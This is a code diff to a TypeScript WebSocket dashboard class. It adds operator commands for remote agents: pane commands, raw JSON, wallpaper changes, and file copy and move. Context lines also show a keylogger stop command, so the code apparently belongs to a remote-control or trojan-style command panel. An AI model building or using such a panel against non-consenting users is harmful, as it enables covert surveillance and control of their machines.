@@ -154,6 +154,16 @@ class DashboardSocket {
     this.ws.send(JSON.stringify({ target: agentId, command }));
   }
 
+  sendPaneCommand(agentId: string, command: string, sessionId: string) {
+    const payload: any = { command, session_id: sessionId };
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
+      this.pending.push({ target: agentId, payload });
+      this.connect();
+      return;
+    }
+    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
+  }
+
   sendCommandToMany(agentIds: string[], command: string) {
     agentIds.forEach((id) => this.sendCommand(id, command));
   }
@@ -244,6 +254,16 @@ class DashboardSocket {
     this.ws.send(JSON.stringify({ target: agentId, ...p }));
   }
 
+  sendAgentJson(agentId: string, payload: any) {
+    const p = payload || {};
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
+      this.pending.push({ target: agentId, payload: p });
+      this.connect();
+      return;
+    }
+    this.ws.send(JSON.stringify({ target: agentId, ...p }));
+  }
+
   endInteractive(agentId: string) {
     const payload = { type: 'end_interactive' };
     if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
@@ -293,6 +313,24 @@ class DashboardSocket {
     const payload = { type: 'keylog_stop' };
     if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload }); this.connect(); return; }
     this.ws.send(JSON.stringify({ target: agentId, ...payload }));
+  }
+
+  setWallpaper(agentId: string, payload: { url?: string; path?: string; data_url?: string; style?: 'fill'|'fit'|'stretch'|'tile'|'center'|'span' }) {
+    const p = { type: 'wallpaper_set', ...payload } as any;
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
+    this.ws.send(JSON.stringify({ target: agentId, ...p }));
+  }
+
+  fsCopy(agentId: string, payload: { items: string[]; src_dir: string; dest_dir: string; overwrite?: boolean }) {
+    const p = { type: 'fs_copy', ...payload } as any;
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
+    this.ws.send(JSON.stringify({ target: agentId, ...p }));
+  }
+
+  fsMove(agentId: string, payload: { items: string[]; src_dir: string; dest_dir: string; overwrite?: boolean }) {
+    const p = { type: 'fs_move', ...payload } as any;
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
+    this.ws.send(JSON.stringify({ target: agentId, ...p }));
   }
 }
 
